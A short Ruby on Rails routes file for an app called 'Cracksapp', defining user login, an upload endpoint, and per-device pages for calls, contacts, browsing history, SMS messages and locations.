Cracksapp::Application.routes.draw do
  devise_for :users
  # The priority is based upon order of creation: first created -> highest priority.
  # See how all your routes lay out with "rake routes".

  post 'upload' => 'upload#index'

  get 'devices' => 'devices#index'
  get 'devices/:id/change/:name' => 'devices#change'

  get 'general/:id' => 'general#index'
  get 'calls/:id' => 'calls#index'
  get 'contacts/:id' => 'contacts#index'
  get 'history/:id' => 'history#index'

  get 'sms/:id' => 'sms#index'
  get 'sms/:id/messages/:address' => 'sms#messages'

  get 'location/:id' => 'location#index'
  get 'location/:id/fetch/:date' => 'location#fetch'

  root 'home#index'
end
